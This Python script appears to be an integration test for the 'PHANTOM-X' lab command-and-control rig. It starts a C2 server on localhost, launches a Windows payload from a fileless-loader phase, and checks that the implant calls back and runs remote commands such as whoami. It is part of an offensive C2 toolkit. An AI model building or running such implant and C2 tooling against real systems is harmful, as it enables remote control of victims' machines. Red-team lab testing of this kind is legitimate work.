#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHANTOM-X :: Phase 5 -- C2 integration test
================================================================================
test_c2_integration.py -- End-to-end exercise of the lab C2 rig.

    Starts the C2 server, launches the Windows payload, and drives a full
    session: HELLO, EXEC -> RESULT round trips, latency measurement, and a
    clean EXIT handshake. Prints a PASS/FAIL report and a JSON result file.

    On Linux the payload is launched under Wine so the rig can be validated
    before it ever reaches the Windows VM. On Windows the payload is launched
    directly.

USAGE
    python3 test_c2_integration.py
    python3 test_c2_integration.py --payload-cmd "./px_payload.exe 127.0.0.1 {port}"
    python3 test_c2_integration.py --json result.json
"""

from __future__ import annotations

import argparse
import json
import os
import shlex
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from c2_server import C2Server  # noqa: E402


def wait_for_session(srv: C2Server, timeout: float = 30.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        with srv.session_lock:
            if srv.sessions:
                return list(srv.sessions.values())[0]
        time.sleep(0.1)
    return None


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="C2 integration test")
    ap.add_argument("--port", type=int, default=9201)
    ap.add_argument("--payload-cmd", default=None,
                    help="command template; {port} is substituted. "
                         "Default launches the built payload under Wine on "
                         "Linux, directly on Windows.")
    ap.add_argument("--payload", default=os.path.join(
        HERE, "..", "phase3_fileless", "loader", "px_payload.exe"))
    ap.add_argument("--json", default=None)
    ap.add_argument("--timeout", type=float, default=40.0)
    args = ap.parse_args(argv)

    payload = os.path.abspath(args.payload)
    if not os.path.exists(payload):
        print(f"error: payload not found: {payload}", file=sys.stderr)
        return 2

    if args.payload_cmd:
        cmdline = args.payload_cmd.replace("{port}", str(args.port))
    elif sys.platform.startswith("linux"):
        cmdline = f'wine "{payload}" 127.0.0.1 {args.port}'
    else:
        cmdline = f'"{payload}" 127.0.0.1 {args.port}'

    print("=" * 72)
    print("PHANTOM-X :: C2 INTEGRATION TEST")
    print("=" * 72)
    print(f"payload : {payload}")
    print(f"command : {cmdline}")
    print()

    srv = C2Server("127.0.0.1", args.port, "/tmp/px_c2_itest.jsonl",
                   console=False)
    t = threading.Thread(target=srv.start, daemon=True)
    t.start()
    time.sleep(1.0)

    proc = subprocess.Popen(cmdline, shell=True,
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True)
    results = {"started_utc": datetime.now(timezone.utc).isoformat(),
               "command": cmdline, "checks": []}

    def check(name, ok, detail=""):
        results["checks"].append({"name": name, "pass": bool(ok), "detail": str(detail)})
        print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + (f" -- {detail}" if detail else ""))
        return ok

    all_ok = True
    try:
        sess = wait_for_session(srv, timeout=args.timeout)
        all_ok &= check("payload established a session", sess is not None,
                        f"session={sess.id}" if sess else "no session")
        if not sess:
            raise SystemExit(1)

        all_ok &= check("HELLO parsed", sess.host not in (None, "?", ""),
                        f"host={sess.host} arch={sess.arch} pid={sess.pid}")

        lat = srv.measure_latency(sess, timeout=15)
        all_ok &= check("latency measured (PING/PONG)", lat is not None,
                        f"{lat:.2f} ms" if lat is not None else "no PONG")

        for cmd in ("whoami", "cmd /c echo PHANTOM_X_EXEC_PROOF",
                    "cmd /c ver"):
            res = srv.exec(sess, cmd, timeout=30)
            ok = res is not None and "output" in res
            out = (res or {}).get("output", "").strip()
            all_ok &= check(f"EXEC returns output: {cmd!r}", ok,
                            repr(out[:120]))
            if cmd.startswith("cmd /c echo"):
                all_ok &= check("command output is correct",
                                "PHANTOM_X_EXEC_PROOF" in out, repr(out[:120]))

        all_ok &= check("session command counters increment",
                        sess.commands_completed >= 3,
                        f"completed={sess.commands_completed} issued={sess.commands_issued}")

        srv.audit.write("test_kill", session=sess.id)
        sess.send("EXIT")
        for _ in range(50):
            if not sess.alive:
                break
            time.sleep(0.1)
        all_ok &= check("clean session termination on EXIT", not sess.alive,
                        "payload acknowledged EXIT")
    finally:
        try:
            proc.terminate()
            out, _ = proc.communicate(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, _ = proc.communicate()
        results["payload_stdout"] = out[-4000:]
        srv.running = False
        try:
            srv.shutdown()
        except Exception:
            pass

    results["finished_utc"] = datetime.now(timezone.utc).isoformat()
    results["result"] = "pass" if all_ok else "fail"
    results["audit_log"] = "/tmp/px_c2_itest.jsonl"

    print()
    print("-" * 72)
    print(f"RESULT: {'PASS' if all_ok else 'FAIL'}")
    print("-" * 72)

    if args.json:
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump(results, fh, indent=2)
        print(f"[+] JSON written: {os.path.abspath(args.json)}")

    return 0 if all_ok else 1


if __name__ == "__main__":
    sys.exit(main())
